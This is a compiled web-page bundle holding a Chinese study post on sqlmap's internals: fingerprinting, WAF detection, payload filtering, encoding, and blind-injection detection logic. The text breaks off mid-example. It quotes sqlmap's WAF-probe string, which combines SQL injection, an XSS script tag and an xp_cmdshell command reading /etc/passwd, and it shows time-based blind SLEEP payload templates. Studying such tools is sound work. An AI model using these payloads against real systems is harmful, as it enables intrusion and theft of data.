import{_ as l,Y as o,Z as p,$ as n,a0 as s,a1 as e,a2 as t,D as i}from"./framework-d651fda7.js";const c="/assets/sqlmap源码学习_image-20230331012916555-0699b623.png",u="/assets/sqlmap_request_queryPage-18123ccb.png",r={},d=n("h1",{id:"sqlmap工具学习",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#sqlmap工具学习","aria-hidden":"true"},"#"),s(" sqlmap工具学习")],-1),k={href:"https://notes.surfrid3r.top/Security/Web/SQL%E6%B3%A8%E5%85%A5/Sqlmap/sqlmap%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/",target:"_blank",rel:"noopener noreferrer"},m=t('<h2 id="sqlmap检测流程" tabindex="-1"><a class="header-anchor" href="#sqlmap检测流程" aria-hidden="true">#</a> sqlmap检测流程</h2><p>sqlmap的主要流程如下，详细可见笔记。</p><figure><img src="'+c+'" alt="sqlmap源码学习" tabindex="0" loading="lazy"><figcaption>sqlmap源码学习</figcaption></figure><h2 id="sqlmap的核心函数" tabindex="-1"><a class="header-anchor" href="#sqlmap的核心函数" aria-hidden="true">#</a> sqlmap的核心函数</h2>',4),v={href:"https://notes.surfrid3r.top/2023/02/07/sqlmap%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/",target:"_blank",rel:"noopener noreferrer"},h=t('<h2 id="sqlmap的核心技术" tabindex="-1"><a class="header-anchor" href="#sqlmap的核心技术" aria-hidden="true">#</a> sqlmap的核心技术</h2><h3 id="sqlmap的指纹识别" tabindex="-1"><a class="header-anchor" href="#sqlmap的指纹识别" aria-hidden="true">#</a> sqlmap的指纹识别</h3><p>sqlmap整个流程中有收集target站点信息以及多种类型的指纹，每一种指纹类型都是为了帮助 sqlmap 在后续的不同sql注入类型测试中去降低发送payload的测试范围，能够更加快速的完成注入检测。主要的指纹类型识别有如下几大类：</p><ul><li><p>操作系统</p></li><li><p>WAF类型</p></li><li><p>服务器类型</p></li><li><p>DBMS数据库类型</p></li></ul><p>接下来分析这几种指纹，sqlmap 是如何识别的。</p><h4 id="操作系统、dbms和服务器指纹识别" tabindex="-1"><a class="header-anchor" href="#操作系统、dbms和服务器指纹识别" aria-hidden="true">#</a> 操作系统、DBMS和服务器指纹识别</h4>',6),g={href:"https://notes.surfrid3r.top/2023/02/12/sqlmap%E6%A0%B8%E5%BF%83%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/#2-process-response",target:"_blank",rel:"noopener noreferrer"},b=n("code",null,"kb.headersFp",-1),E=t('<h5 id="基于http-header的指纹识别" tabindex="-1"><a class="header-anchor" href="#基于http-header的指纹识别" aria-hidden="true">#</a> 基于HTTP header的指纹识别</h5><p>其对应的指纹文件位于 <code>sqlmap/data/xml/banner/</code> 路径下，主要的如下（主要是基于 HTTP Header的指纹识别）：</p><ul><li><code>sharepoint.xml</code> - 识别 SharePoint 服务器</li><li><code>server.xml</code> -识别各种类型服务器和操作系统（IIS, Apache, Nginx, GoogleWebServer, lighttpd, OpenResty, LiteSpeed, SunONE）* (Windows，各种类型的 Linux 操作系统)</li><li><code>servlet-engine.xml</code> - 识别 Java Servlet 中间件</li><li><code>set-cookie.xml</code> - 通过 cookie 参数类型识别语言或者 CMS</li><li><code>x-aspnet-version.xml</code> - 识别 ASP. NET 版本</li><li><code>x-powered-by.xml</code> - 通过 x-powered-by 识别语言或者 CMS</li><li><code>generic.xml</code> - 通用的字段，会尝试匹配所有的 Headers，主要是识别操作系统</li></ul><h5 id="基于http-responsebody的指纹识别" tabindex="-1"><a class="header-anchor" href="#基于http-responsebody的指纹识别" aria-hidden="true">#</a> 基于HTTP ResponseBody的指纹识别</h5><p>不同于上述的指纹识别，基于响应包内容的识别是针对报错信息的识别。sqlmap 先通过简单的正则<code>SQL (warning|error|syntax)</code>匹配，再同<code>errors.xml</code>中的数据库指纹信息匹配，主要是用来识别DBMS类型的。</p><ul><li><code>errors.xml</code> - 识别 DMBS 类型</li></ul><h5 id="sql注入后的dbms版本识别" tabindex="-1"><a class="header-anchor" href="#sql注入后的dbms版本识别" aria-hidden="true">#</a> sql注入后的DBMS版本识别</h5>',7),_=n("code",null,"mysql",-1),q=n("code",null,"mysql",-1),A={href:"https://notes.surfrid3r.top/2023/02/12/sqlmap%E6%A0%B8%E5%BF%83%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/#check-dbms",target:"_blank",rel:"noopener noreferrer"},y=n("h4",{id:"waf指纹识别",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#waf指纹识别","aria-hidden":"true"},"#"),s(" WAF指纹识别")],-1),L=n("code",null,"IPS_WAF_CHECK_RATIO = 0.5",-1),f={href:"https://note.surfrid3r.top/Security/Web/SQL%E6%B3%A8%E5%85%A5/Sqlmap/sqlmap%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#2-1-6-check-waf",target:"_blank",rel:"noopener noreferrer"},N=t(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>IPS_WAF_CHECK_PAYLOAD <span class="token operator">=</span> <span class="token string">&quot;AND 1=1 UNION ALL SELECT 1,NULL,&#39;&lt;script&gt;alert(\\&quot;XSS\\&quot;)&lt;/script&gt;&#39;,table_name FROM information_schema.tables WHERE 2&gt;1--/**/; EXEC xp_cmdshell(&#39;cat ../../../etc/passwd&#39;)#&quot;</span>
payload <span class="token operator">=</span> <span class="token string">&quot;%d %s&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>randomInt<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> IPS_WAF_CHECK_PAYLOAD<span class="token punctuation">)</span>
place <span class="token operator">=</span> PLACE<span class="token punctuation">.</span>GET
<span class="token keyword">if</span> PLACE<span class="token punctuation">.</span>URI <span class="token keyword">in</span> conf<span class="token punctuation">.</span>parameters<span class="token punctuation">:</span>
    value <span class="token operator">=</span> <span class="token string">&quot;%s=%s&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>randomStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> agent<span class="token punctuation">.</span>addPayloadDelimiters<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    value <span class="token operator">=</span> <span class="token string">&quot;&quot;</span> <span class="token keyword">if</span> <span class="token keyword">not</span> conf<span class="token punctuation">.</span>parameters<span class="token punctuation">.</span>get<span class="token punctuation">(</span>PLACE<span class="token punctuation">.</span>GET<span class="token punctuation">)</span> <span class="token keyword">else</span> conf<span class="token punctuation">.</span>parameters<span class="token punctuation">[</span>PLACE<span class="token punctuation">.</span>GET<span class="token punctuation">]</span> <span class="token operator">+</span> DEFAULT_GET_POST_DELIMITER
    <span class="token comment"># 随机生成一段randstr()=payload进行参数拼接</span>
    value <span class="token operator">+=</span> <span class="token string">&quot;%s=%s&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>randomStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> agent<span class="token punctuation">.</span>addPayloadDelimiters<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1),S=n("code",null,"sqlmap\\thirdparty\\identywaf",-1),T={href:"https://github.com/stamparm/identYwaf%E3%80%82sqlmap",target:"_blank",rel:"noopener noreferrer"},x=n("code",null,"data,json",-1),D=t(`<div class="language-json line-numbers-mode" data-ext="json"><pre class="language-json"><code><span class="token property">&quot;airlock&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
		<span class="token property">&quot;company&quot;</span><span class="token operator">:</span> <span class="token string">&quot;Phion/Ergon&quot;</span><span class="token punctuation">,</span>
		<span class="token property">&quot;name&quot;</span><span class="token operator">:</span> <span class="token string">&quot;Airlock&quot;</span><span class="token punctuation">,</span>
		<span class="token property">&quot;regex&quot;</span><span class="token operator">:</span> <span class="token string">&quot;The server detected a syntax error in your request&quot;</span><span class="token punctuation">,</span>
		<span class="token property">&quot;signatures&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">&quot;3e2c:RVZXu261OEhCWapBYKcPk4JzWOtohM4IiUcMr2RXg1uQJbX3uhdOn9htOj+hX7AB16FcPxJPdLsXomtKaK59n+i6c4RmkwI2FZjxtDtAeq6c36A5chW1XaTD&quot;</span><span class="token punctuation">]</span>
	<span class="token punctuation">}</span><span class="token punctuation">,</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1),B=n("code",null,"signatures",-1),C={href:"https://www.slideshare.net/stamparm/blind-waf-identification%E3%80%82%E9%A1%BA%E4%BE%BF%E5%88%86%E6%9E%90%E4%BA%86%E4%B8%80%E4%B8%8B%60identYwaf%60%E5%AF%B9%E8%AF%A5%E5%AD%97%E6%AE%B5%E7%9A%84%E4%BD%BF%E7%94%A8%E3%80%82%EF%BC%88%E8%AF%A6%E8%A7%81",target:"_blank",rel:"noopener noreferrer"},I={href:"https://notes.surfrid3r.top/2023/04/05/identYwaf/#signatures",target:"_blank",rel:"noopener noreferrer"},M=t(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># Check if it is MySQL &gt;= 5.1.2 and &lt; 5.5.0</span>
<span class="token keyword">elif</span> inject<span class="token punctuation">.</span>checkBooleanExpression<span class="token punctuation">(</span><span class="token string">&quot;@@table_open_cache=@@table_open_cache&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">if</span> inject<span class="token punctuation">.</span>checkBooleanExpression<span class="token punctuation">(</span><span class="token string">&quot;[RANDNUM]=(SELECT [RANDNUM] FROM information_schema.GLOBAL_STATUS LIMIT 0, 1)&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		Backend<span class="token punctuation">.</span>setVersionList<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&quot;&gt;= 5.1.12&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&lt; 5.5.0&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
	<span class="token keyword">elif</span> inject<span class="token punctuation">.</span>checkBooleanExpression<span class="token punctuation">(</span><span class="token string">&quot;[RANDNUM]=(SELECT [RANDNUM] FROM information_schema.PROCESSLIST LIMIT 0, 1)&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		Backend<span class="token punctuation">.</span>setVersionList<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&quot;&gt;= 5.1.7&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&lt; 5.1.12&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
	<span class="token keyword">elif</span> inject<span class="token punctuation">.</span>checkBooleanExpression<span class="token punctuation">(</span><span class="token string">&quot;[RANDNUM]=(SELECT [RANDNUM] FROM information_schema.PARTITIONS LIMIT 0, 1)&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		Backend<span class="token punctuation">.</span>setVersion<span class="token punctuation">(</span><span class="token string">&quot;= 5.1.6&quot;</span><span class="token punctuation">)</span>
	<span class="token keyword">elif</span> inject<span class="token punctuation">.</span>checkBooleanExpression<span class="token punctuation">(</span><span class="token string">&quot;[RANDNUM]=(SELECT [RANDNUM] FROM information_schema.PLUGINS LIMIT 0, 1)&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		Backend<span class="token punctuation">.</span>setVersionList<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&quot;&gt;= 5.1.5&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&lt; 5.1.6&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
	<span class="token keyword">else</span><span class="token punctuation">:</span>
		Backend<span class="token punctuation">.</span>setVersionList<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&quot;&gt;= 5.1.2&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&lt; 5.1.5&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment"># ...</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1),R=n("h3",{id:"sqlmap的request-querypage函数",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#sqlmap的request-querypage函数","aria-hidden":"true"},"#"),s(" sqlmap的Request.queryPage函数")],-1),O=n("code",null,"Request.queryPage",-1),U={href:"https://notes.surfrid3r.top/2023/02/12/sqlmap%E6%A0%B8%E5%BF%83%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/#request-query-page",target:"_blank",rel:"noopener noreferrer"},P=n("img",{src:u,alt:"sqlmap_request_queryPage|",style:{zoom:"8%"}},null,-1),F=n("h3",{id:"sqlmap的一些检测",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#sqlmap的一些检测","aria-hidden":"true"},"#"),s(" sqlmap的一些检测")],-1),w={href:"https://notes.surfrid3r.top/2023/02/20/sqlmap%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%9B%B8%E4%BC%BC%E5%BA%A6%E5%88%A4%E6%96%AD/#check-stability",target:"_blank",rel:"noopener noreferrer"},Y={href:"https://notes.surfrid3r.top/2023/02/20/sqlmap%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%9B%B8%E4%BC%BC%E5%BA%A6%E5%88%A4%E6%96%AD/#find-dynamic-content",target:"_blank",rel:"noopener noreferrer"},H={href:"https://notes.surfrid3r.top/2023/02/07/sqlmap%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#2-2-1-check-dyn-param",target:"_blank",rel:"noopener noreferrer"},V=n("code",null,"--null-connection",-1),Q={href:"https://notes.surfrid3r.top/2023/02/07/sqlmap%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#2-1-7-check-null-connection",target:"_blank",rel:"noopener noreferrer"},W=n("code",null,"Content-Length",-1),X=n("code",null,"Range",-1),G=n("h3",{id:"sqlmap的payload",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#sqlmap的payload","aria-hidden":"true"},"#"),s(" sqlmap的payload")],-1),j=n("h4",{id:"payload过滤",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#payload过滤","aria-hidden":"true"},"#"),s(" payload过滤")],-1),K=n("p",null,[s("sqlmap 的测试 payload 模板均位于"),n("code",null,".\\data\\xml\\payloads\\boolean_blind.xml"),s("目录下，数量是非常庞大的。并且一个 payload 模板往往需要花费的不只是一个请求数据包，而是数十个甚至上百个。那么一次性全部发送不然是不行的，非常耗时，sqlmap 在具体测试会使用许多过滤条件来尽可能的减少无意义 payload 的发送数量。下面列举一些 sqlmap 过滤 payload 的方式")],-1),z=n("code",null,"risk",-1),J=n("code",null,"level",-1),Z=n("code",null,"risk",-1),$=n("code",null,"level",-1),nn={href:"https://notes.surfrid3r.top/2023/02/12/sqlmap%E7%9A%84level%E5%92%8Crisk%E7%AD%89%E7%BA%A7%E5%AE%9A%E4%B9%89/",target:"_blank",rel:"noopener noreferrer"},sn=n("li",null,"通过指纹的识别，只使用对应 DBMS 类型的 payload 测试。",-1),an=n("li",null,[s("如果别的类型的sql注入已经测试成功，那么测试不同类型的sql注入时不会使用相同"),n("code",null,"<clause>"),s("标签的payload.")],-1),en=n("h4",{id:"payload模板",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#payload模板","aria-hidden":"true"},"#"),s(" payload模板")],-1),tn=n("code",null,"boundaries.xml",-1),ln=n("code",null,"payloads/*.xml",-1),on={href:"https://notes.surfrid3r.top/2023/02/26/sqlmap%E7%9A%84XML%E6%96%87%E4%BB%B6/",target:"_blank",rel:"noopener noreferrer"},pn=n("ol",null,[n("li",null,"其中 payload 还包含大量的特殊字符串，用于在生成模板的时候进行替换，主要包含积累：")],-1),cn=n("ul",null,[n("li",null,"随机字符"),n("li",null,"分隔符（用于在报错注入等回显型注入的时候在响应包中匹配内容）"),n("li",null,"时延"),n("li",null,"注释符"),n("li",null,[s("后利用语句标记（"),n("code",null,"[INFERENCE]"),s("）")])],-1),un={start:"2"},rn={href:"https://notes.surfrid3r.top/2023/02/26/sqlmap%E7%9A%84XML%E6%96%87%E4%BB%B6/",target:"_blank",rel:"noopener noreferrer"},dn=n("p",null,[s("不过这里需要注意的是其中两种类型中的"),n("code",null,"where"),s("标签，"),n("code",null,"where"),s("标签分为三种数值，这决定了如何处理原始参数后的数值同 sqlmap 添加的 payload的关系，是直接拼接，取负后拼接还是替换，这是会影响后续sql注入效果的。")],-1),kn=n("ol",null,[n("li",null,"将注入 payload 添加到注入参数的原始数值前。"),n("li",null,"将注入参数的原始数值替换为一个负随机值并在这之后添加注入"),n("li",null,"用 payload 替换掉注入参数的原始数值。")],-1),mn=n("h4",{id:"payload编码绕过",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#payload编码绕过","aria-hidden":"true"},"#"),s(" payload编码绕过")],-1),vn=n("p",null,"实际测试中，可以看到从xml中渲染的 payload 到 sqlmap 真实发送给目标站点的 payload,其实对内容进行了hex、base64编码等操作。",-1),hn={href:"https://notes.surfrid3r.top/2023/02/12/sqlmap%E6%A0%B8%E5%BF%83%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/#adjust-late-values",target:"_blank",rel:"noopener noreferrer"},gn=t(`<li><p>hex等编码，sqlmap 默认存在<code>Syntax</code>类，位于<code>sqlmap\\plugins\\generic\\syntax.py</code>,在发送payload之前该函数会被调用。</p><div class="language-Python line-numbers-mode" data-ext="Python"><pre class="language-Python"><code>class Syntax(object):
    &quot;&quot;&quot;
    This class defines generic syntax functionalities for plugins.
    &quot;&quot;&quot;

    def __init__(self):
        pass

    @staticmethod
    def _escape(expression, quote=True, escaper=None):
        retVal = expression
        # 编码所有单引号的中文本内容
        if quote:
            for item in re.findall(r&quot;&#39;[^&#39;]*&#39;+&quot;, expression):
                original = item[1:-1]
                if original:
                    if Backend.isDbms(DBMS.SQLITE) and &quot;X%s&quot; % item in expression:
                        continue
                    if re.search(r&quot;\\[(SLEEPTIME|RAND)&quot;, original) is None:  # e.g. &#39;[SLEEPTIME]&#39; marker
                        replacement = escaper(original) if not conf.noEscape else original

                        if replacement != original:
                            retVal = retVal.replace(item, replacement)
                        elif len(original) != len(getBytes(original)) and &quot;n&#39;%s&#39;&quot; % original not in retVal and Backend.getDbms() in (DBMS.MYSQL, DBMS.PGSQL, DBMS.ORACLE, DBMS.MSSQL):
                            retVal = retVal.replace(&quot;&#39;%s&#39;&quot; % original, &quot;n&#39;%s&#39;&quot; % original)
        else:
            retVal = escaper(expression)

        return retVal

    @staticmethod
    def escape(expression, quote=True):
        errMsg = &quot;&#39;escape&#39; method must be defined &quot;
        errMsg += &quot;inside the specific DBMS plugin&quot;
        raise SqlmapUndefinedMethod(errMsg)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>并且当确认了具体的DMBS类型，会设置对应的handler,<code>.\\plugins\\dbms\\*</code>下每个数据库也会重写该 escape 函数，以 mysql 为例如下。mysql将引号内字符进行16进制编码。</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">class</span> <span class="token class-name">Syntax</span><span class="token punctuation">(</span>GenericSyntax<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token decorator annotation punctuation">@staticmethod</span>
    <span class="token keyword">def</span> <span class="token function">escape</span><span class="token punctuation">(</span>expression<span class="token punctuation">,</span> quote<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">&quot;&quot;&quot;
        &gt;&gt;&gt; Syntax.escape(&quot;SELECT &#39;abcdefgh&#39; FROM foobar&quot;) == &quot;SELECT 0x6162636465666768 FROM foobar&quot;
        True
        &gt;&gt;&gt; Syntax.escape(u&quot;SELECT &#39;abcd\\xebfgh&#39; FROM foobar&quot;) == &quot;SELECT CONVERT(0x61626364c3ab666768 USING utf8) FROM foobar&quot;
        True
        &quot;&quot;&quot;</span>

        <span class="token keyword">def</span> <span class="token function">escaper</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token builtin">all</span><span class="token punctuation">(</span>_ <span class="token operator">&lt;</span> <span class="token number">128</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> getOrds<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string">&quot;0x%s&quot;</span> <span class="token operator">%</span> getUnicode<span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>getBytes<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string">&quot;CONVERT(0x%s USING utf8)&quot;</span> <span class="token operator">%</span> getUnicode<span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>getBytes<span class="token punctuation">(</span>value<span class="token punctuation">,</span> <span class="token string">&quot;utf8&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        <span class="token keyword">return</span> Syntax<span class="token punctuation">.</span>_escape<span class="token punctuation">(</span>expression<span class="token punctuation">,</span> quote<span class="token punctuation">,</span> escaper<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>`,1),bn={href:"https://notes.surfrid3r.top/2023/02/12/sqlmap%E6%A0%B8%E5%BF%83%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/#payload",target:"_blank",rel:"noopener noreferrer"},En=t(`<h3 id="sqlmap的sql注入攻击成功检测" tabindex="-1"><a class="header-anchor" href="#sqlmap的sql注入攻击成功检测" aria-hidden="true">#</a> sqlmap的sql注入攻击成功检测</h3><p>为了检测SQL注入攻击是否成功，sqlmap需要根据相应的payload结果进行判断。不同类型的payload判断方式不同，而这些判断方式都写在<code>payloads/*.xml</code>的单个payload文件中。sqlmap主要分为以下四种判断类型：</p><ul><li>时间盲注</li><li>布尔盲注</li><li>报错注入和内联注入</li><li>Union注入</li></ul><h4 id="时间盲注" tabindex="-1"><a class="header-anchor" href="#时间盲注" aria-hidden="true">#</a> 时间盲注</h4><p>时间盲注的 payload 位于<code>time_blind.xml</code>中,以其中一个为例来说明 sqlmap 的时间盲注检测逻辑。首先是对应的 payload 模板如下：</p><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>test</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>MySQL <span class="token entity named-entity" title="&gt;">&amp;gt;</span>= 5.0.12 AND time-based blind (query SLEEP)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stype</span><span class="token punctuation">&gt;</span></span>5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stype</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>level</span><span class="token punctuation">&gt;</span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>level</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>risk</span><span class="token punctuation">&gt;</span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>risk</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>clause</span><span class="token punctuation">&gt;</span></span>1,2,3,8,9<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>clause</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>where</span><span class="token punctuation">&gt;</span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>where</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>vector</span><span class="token punctuation">&gt;</span></span>AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>vector</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>request</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>payload</span><span class="token punctuation">&gt;</span></span>AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>payload</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>request</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>response</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>time</span><span class="token punctuation">&gt;</span></span>[SLEEPTIME]<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>time</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>response</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>details</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dbms</span><span class="token punctuation">&gt;</span></span>MySQL<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dbms</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dbms_version</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&gt;">&amp;gt;</span>= 5.0.12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dbms_version</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>details</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>test</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,6),_n=n("code",null,"request.payload",-1),qn=n("code",null,"reponse",-1),An=n("code",null,"boundaries.xml",-1),yn=n("code",null,"SLEEPTIME",-1),Ln={href:"https://notes.surfrid3r.top/2023/02/12/sqlmap%E6%A0%B8%E5%BF%83%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/#time",target:"_blank",rel:"noopener noreferrer"},fn=t(`<p>另外，如果没有手动设置<code>--timeSec</code>参数，sqlmap将计算站点的平均响应时长，并且会持续更新以防止异常的网络波动对检测造成大量干扰。在进行时间盲注检测之前，sqlmap通常会发送至少30个数据包，并以队列形式保存这些响应时间（最多不超过200个）。如果当前响应时间超过了 <code>MAX(MIN_VALID_DELAYED_RESPONSE, 平均时延+7 * deviation)</code> 的时长（<code>MIN_VALID_DELAYED_RESPONSE</code>=0.5），则sqlmap会判断该请求存在时延。</p><h4 id="布尔盲注" tabindex="-1"><a class="header-anchor" href="#布尔盲注" aria-hidden="true">#</a> 布尔盲注</h4><p>布尔盲注的 payload 位于<code>boolean_blind.xml</code>,同样以其中一个为例说明：</p><div class="language-XML line-numbers-mode" data-ext="XML"><pre class="language-XML"><code>&lt;test&gt;
    &lt;title&gt;AND boolean-based blind - WHERE or HAVING clause&lt;/title&gt;
    &lt;stype&gt;1&lt;/stype&gt;
    &lt;level&gt;1&lt;/level&gt;
